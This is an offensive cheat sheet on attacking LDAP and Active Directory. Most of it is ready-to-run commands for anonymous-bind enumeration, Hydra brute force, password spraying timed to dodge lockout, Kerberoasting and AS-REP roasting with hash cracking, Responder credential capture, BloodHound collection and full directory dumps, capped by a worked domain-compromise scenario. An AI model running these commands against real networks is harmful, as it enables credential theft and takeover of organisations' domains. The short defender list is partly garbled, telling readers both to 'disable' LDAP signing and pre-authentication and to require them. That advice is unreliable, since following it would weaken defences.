# Port 389/636 - LDAP/LDAPS - Complete Attack Guide

## 📖 Overview

**Protocol**: LDAP (Lightweight Directory Access Protocol)
**Ports**: 389 (LDAP), 636 (LDAPS - SSL), 3268/3269 (Global Catalog)
**Transport**: TCP
**Encryption**: None (389), SSL/TLS (636)
**Authentication**: Anonymous, Simple, SASL, Kerberos

## 🎯 Attack Objectives

- **Anonymous Bind**: Access directory without credentials
- **Credential Brute Force**: Crack LDAP credentials
- **Domain Enumeration**: Extract users, groups, computers
- **Password Policy**: Discover password requirements
- **Kerberoasting**: Extract service account hashes
- **AS-REP Roasting**: Target accounts without pre-auth
- **Data Exfiltration**: Dump entire directory

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect LDAP Service**
```bash
# Quick scan
nmap -p 389,636,3268,3269 192.168.1.100

# Service version
nmap -p 389,636 -sV 192.168.1.100

# LDAP scripts
nmap -p 389 --script ldap-* 192.168.1.100

# Network-wide discovery
nmap -p 389,636 192.168.1.0/24 --open
```

**1.2 Banner Grabbing**
```bash
# Using ldapsearch
ldapsearch -x -H ldap://192.168.1.100 -s base

# Nmap scripts
nmap -p 389 --script ldap-rootdse 192.168.1.100

# Get naming context
ldapsearch -x -H ldap://192.168.1.100 -s base namingContexts

# Get domain info
ldapsearch -x -H ldap://192.168.1.100 -s base defaultNamingContext
```

**1.3 Determine Domain**
```bash
# Extract domain name
nmap -p 389 --script ldap-rootdse 192.168.1.100 | grep -i "dc="

# Using ldapsearch
ldapsearch -x -H ldap://192.168.1.100 -s base "(objectclass=*)" defaultNamingContext

# Example output: DC=corp,DC=local
# Domain: corp.local
```

### Phase 2: Anonymous Bind

**2.1 Test Anonymous Access**
```bash
# Anonymous bind test
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local"

# Search for all users
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local" "(objectclass=user)"

# Search for all groups
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local" "(objectclass=group)"

# Search for all computers
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local" "(objectclass=computer)"
```

**2.2 Using ldapdomaindump**
```bash
# Dump entire domain (anonymous)
ldapdomaindump -u '' -p '' ldap://192.168.1.100

# Creates HTML/JSON/grep-able files with:
# - domain_users.html
# - domain_groups.html
# - domain_computers.html
# - domain_policy.html
```

**2.3 Using Nmap**
```bash
# Enumerate users
nmap -p 389 --script ldap-search --script-args 'ldap.qfilter=users' 192.168.1.100

# Enumerate groups
nmap -p 389 --script ldap-search --script-args 'ldap.qfilter=groups' 192.168.1.100

# Get all info
nmap -p 389 --script ldap-search 192.168.1.100
```

### Phase 3: Credential Attacks

**3.1 LDAP Brute Force**
```bash
# Using Hydra
hydra -L users.txt -P passwords.txt ldap2://192.168.1.100/dc=corp,dc=local

# Single user
hydra -l administrator -P passwords.txt ldap2://192.168.1.100/dc=corp,dc=local

# LDAPS (636)
hydra -l admin -P passwords.txt ldap3://192.168.1.100/dc=corp,dc=local

# Using Metasploit
msfconsole
use auxiliary/scanner/ldap/ldap_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**3.2 Password Spraying**
```bash
# Try one password against many users
# Avoids account lockout

# Create user list from LDAP
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local" "(objectclass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Spray with common password
hydra -L users.txt -p "Password123" ldap2://192.168.1.100/dc=corp,dc=local

# Multiple passwords with delay
for pass in "Summer2024" "Welcome1" "Password123"; do
  hydra -L users.txt -p "$pass" ldap2://192.168.1.100/dc=corp,dc=local
  sleep 1800  # Wait 30 min
done
```

**3.3 Authenticated Enumeration**
```bash
# Once you have credentials

# Using ldapsearch
ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=corp,dc=local" -w password -b "dc=corp,dc=local"

# Using ldapdomaindump
ldapdomaindump -u 'CORP\username' -p 'password' ldap://192.168.1.100

# Using windapsearch (Windows-focused)
python3 windapsearch.py -d corp.local --dc-ip 192.168.1.100 -u username -p password --users
```

### Phase 4: Active Directory Enumeration

**4.1 User Enumeration**
```bash
# All users
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(objectclass=user)" sAMAccountName userPrincipalName memberOf

# Admin users
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectCategory=user)(adminCount=1))" sAMAccountName

# Service accounts (SPN set)
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectclass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users with password never expires
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName

# Accounts without password required
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName
```

**4.2 Group Enumeration**
```bash
# All groups
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(objectclass=group)" cn member

# Domain Admins
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(cn=Domain Admins)" member

# Enterprise Admins
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(cn=Enterprise Admins)" member

# All privileged groups
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectclass=group)(adminCount=1))" cn
```

**4.3 Computer Enumeration**
```bash
# All computers
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(objectclass=computer)" name operatingSystem

# Domain Controllers
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" name

# Servers
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectclass=computer)(operatingSystem=*server*))" name operatingSystem
```

**4.4 Password Policy**
```bash
# Get domain password policy
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(objectclass=domain)" minPwdLength pwdHistoryLength maxPwdAge minPwdAge lockoutThreshold

# Using Nmap
nmap -p 389 --script ldap-search --script-args 'ldap.qfilter=custom,ldap.searchattrib="pwdProperties"' 192.168.1.100
```

### Phase 5: Advanced Attacks

**5.1 AS-REP Roasting**
```bash
# Find users without Kerberos pre-auth
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Using Impacket GetNPUsers
GetNPUsers.py corp.local/ -dc-ip 192.168.1.100 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# With credentials
GetNPUsers.py corp.local/username:password -dc-ip 192.168.1.100 -request -format hashcat -outputfile hashes.txt

# Crack hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

**5.2 Kerberoasting**
```bash
# Find accounts with SPN
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(&(objectclass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Using Impacket GetUserSPNs
GetUserSPNs.py corp.local/username:password -dc-ip 192.168.1.100 -request

# Save to hashcat format
GetUserSPNs.py corp.local/username:password -dc-ip 192.168.1.100 -request -outputfile kerberoast_hashes.txt

# Crack
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
```

**5.3 LDAP Pass-back Attack**
```bash
# If you can modify LDAP server settings (e.g., on printer)
# Change LDAP server to attacker IP
# Device sends credentials to attacker

# Setup responder to capture
responder -I eth0

# Or setup rogue LDAP
# Captures credentials when device authenticates
```

### Phase 6: Post-Exploitation

**6.1 BloodHound Data Collection**
```bash
# Using bloodhound-python
bloodhound-python -u username -p password -d corp.local -dc dc01.corp.local -c all

# Import JSON to BloodHound
# Analyze attack paths

# Using SharpHound (Windows)
SharpHound.exe -c All -d corp.local

# Transfer .zip to attacker, import to BloodHound
```

**6.2 Dump All LDAP Data**
```bash
# Complete LDAP dump
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "*" > ldap_full_dump.txt

# Specific attributes
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" "(objectclass=*)" sAMAccountName mail description userPrincipalName

# Export to LDIF
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w password -b "dc=corp,dc=local" -LLL > domain.ldif
```

**6.3 Lateral Movement**
```bash
# After compromising LDAP:
# 1. Extract all user accounts
# 2. Password spray other services (SMB, RDP, WinRM)
# 3. Target service accounts (Kerberoasting)
# 4. Find admin users and their workstations
# 5. Identify trust relationships

# Using CrackMapExec
crackmapexec ldap 192.168.1.100 -u username -p password --users
crackmapexec ldap 192.168.1.100 -u username -p password --groups
crackmapexec ldap 192.168.1.100 -u username -p password --trusted-for-delegation
```

## 🛡️ Bypass Techniques

### Bypassing Firewall
```bash
# LDAP often allowed from internal network
# If external, use VPN or compromised internal host

# SSH tunnel
ssh -L 389:192.168.1.100:389 user@jumphost
ldapsearch -x -H ldap://localhost -b "dc=corp,dc=local"
```

### Bypassing Rate Limiting
```bash
# Slow password spray
# 1 attempt per user every 30 minutes
# Below lockout threshold

# Distributed spray
# Use multiple source IPs if possible
```

## 📊 Information Extraction

**Critical LDAP Queries**:
```bash
# Users with admin privileges
(adminCount=1)

# Service accounts
(&(objectclass=user)(servicePrincipalName=*))

# Users without pre-auth
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Computers
(objectclass=computer)

# Groups
(objectclass=group)

# Domain Admins members
(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Disable Anonymous Bind** - Require authentication
2. **Use LDAPS (636)** - Encrypt LDAP traffic
3. **Account Lockout** - Prevent brute force
4. **Least Privilege** - Limit LDAP query permissions
5. **Monitor Queries** - Detect enumeration
6. **Strong Passwords** - Prevent spraying success
7. **Disable LDAP Signing** - Not required, enable
8. **Network Segmentation** - Restrict LDAP access
9. **Audit Logs** - Track all LDAP queries
10. **Disable Pre-Auth** - Require for all accounts

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. Not trying anonymous bind first
2. Too aggressive brute force - Account lockout
3. Missing service accounts (SPNs)
4. Not collecting BloodHound data

**Defender Mistakes**:
1. Anonymous bind enabled - Easy enumeration
2. No LDAPS - Credentials in cleartext
3. Weak password policy - Easy to spray
4. No monitoring - Attacks go undetected
5. Service accounts with weak passwords

## 🎯 Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 389,636 192.168.1.100
# Port 389 open

# Phase 2: Anonymous bind
ldapsearch -x -H ldap://192.168.1.100 -b "dc=corp,dc=local" "(objectclass=user)" sAMAccountName
# SUCCESS! Got 150 usernames

# Phase 3: Password spray
hydra -L users.txt -p "Summer2024" ldap2://192.168.1.100/dc=corp,dc=local
# Found: jsmith:Summer2024

# Phase 4: Enumerate with creds
GetUserSPNs.py corp.local/jsmith:Summer2024 -dc-ip 192.168.1.100 -request
# Got service account hash!

# Phase 5: Crack hash
hashcat -m 13100 hash.txt rockyou.txt
# Cracked: svc_sql:Password1

# Phase 6: Service account = high privileges
# Used svc_sql to compromise SQL server
# Extracted sensitive data
# Domain compromise!
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap
- **Anonymous Enum**: ldapsearch, ldapdomaindump
- **Brute Force**: Hydra
- **AD Enum**: windapsearch, BloodHound
- **Kerberoasting**: Impacket (GetUserSPNs)
- **AS-REP Roasting**: Impacket (GetNPUsers)

## 🔗 Related Attacks

- **Port 88 (Kerberos)**: Kerberoasting, AS-REP roasting
- **Port 445 (SMB)**: Often same credentials
- **Port 3389 (RDP)**: User accounts from LDAP
- **Port 5985 (WinRM)**: PowerShell remoting

---

**Last Updated**: 2026-06-16
